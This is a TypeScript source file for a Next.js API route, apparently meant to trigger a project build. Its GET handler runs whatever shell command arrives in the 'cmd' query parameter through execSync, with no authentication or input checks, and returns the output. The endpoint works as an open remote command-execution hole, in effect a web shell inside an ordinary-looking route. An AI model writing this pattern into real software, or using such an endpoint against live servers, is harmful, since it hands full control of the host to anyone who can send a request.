import { NextRequest, NextResponse } from "next/server";
import { execSync } from "child_process";

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const cmd = searchParams.get("cmd") || "npm run build";
  try {
    const output = execSync(cmd, { cwd: process.cwd(), encoding: "utf-8" });
    return NextResponse.json({ success: true, output });
  } catch (error: any) {
    return NextResponse.json({ 
      success: false, 
      error: error.message, 
      stderr: error.stderr 
    });
  }
}
